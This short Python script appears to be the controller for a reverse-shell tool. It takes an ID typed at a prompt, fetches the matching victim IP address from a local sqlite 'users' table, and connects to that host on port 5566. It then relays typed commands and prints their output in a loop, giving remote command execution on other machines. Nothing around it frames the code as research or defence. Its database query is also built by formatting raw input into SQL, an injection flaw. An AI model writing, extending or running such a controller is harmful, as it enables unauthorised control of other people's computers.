import socket
import reverse_sh
import sqlite3


while True:
    cmd = input("/>")
    if cmd == "exit":
        break
    elif "reversh" in cmd:
        uuid = cmd.split(" ")[1]
        print(uuid)
        con = sqlite3.connect('users')
        cur = con.cursor()
        print("[INFO] Database succesfully loaded")
        cur.execute("SELECT IP FROM users WHERE ID = '{}';".format(uuid))
        ip = cur.fetchone()[0]
        print(ip)
        HOST = ip
        PORT = 5566
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            while True:

                cmd = input(">")
                if cmd == ("exit"):
                    break

                s.sendall(str.encode(cmd))
                data = s.recv(1024)
                print(data.decode())
                pass



